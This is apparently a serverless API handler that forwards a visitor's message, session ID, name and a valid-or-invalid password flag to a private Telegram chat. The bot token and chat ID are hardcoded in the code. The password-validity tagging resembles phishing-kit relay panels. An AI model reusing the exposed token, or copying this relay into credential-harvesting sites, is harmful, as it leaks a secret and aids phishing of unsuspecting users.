export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { message, sessionId, name, time, passwordValid } = req.body;

  const TELEGRAM_BOT_TOKEN = "7952631006:AAH1X34veHZIMC6GP6u4hZNp8depSJ4_-II";
  const TELEGRAM_CHAT_ID = "6798950954";

  const statusTag = passwordValid ? "[VALID]" : "[INVALID]";
  const text = `${statusTag} Message from client:\n\n📝 ${message}\n\n🔗 Session: ${sessionId}\n👤 Name : ${name}\n⏰ Time: ${time}\n\n💡 Reply to this message to send a response to the client!`;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'Markdown'
      })
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: error.message });
  }
}
